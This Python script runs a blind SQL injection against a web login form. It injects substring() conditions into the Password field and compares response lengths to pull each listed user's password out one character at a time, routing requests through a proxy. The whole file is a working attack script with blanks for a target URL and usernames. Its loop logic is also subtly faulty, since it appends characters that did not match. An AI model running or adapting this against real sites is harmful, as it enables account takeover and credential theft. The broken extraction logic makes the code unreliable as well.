import requests

#variables, add the suspicious users, in u [] list
url = ''
proxy_url = ''
w = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&*(){}:"<>?'
u = []


#main logic for injection
for user in u:
    data = {'Username': '', 'Password': "' or Username='" + user + "'and substring(Password,0,1)='x"}
    request = requests.post(url,data=data, proxies={'http':proxy_url})
    b = len(request.text) #6756
    cracked_pass = ''
    for i in range(1,80):
        found = False
        for c in w:
            data = {'Username':'', 'Password': "' or Username='" + user + "' and substring(Password," + str(i) + ",1)='" + c + ""}
            request = requests.post(url,data=data, proxies={'http':proxy_url})
            if len(request.text) != b:
                found = True
                break
            
            if not found:
               
                print(' Attempting User {0}'.format(user))
                print('Found Character: {2}'.format(user, i, c))
                cracked_pass += c
    print(cracked_pass)
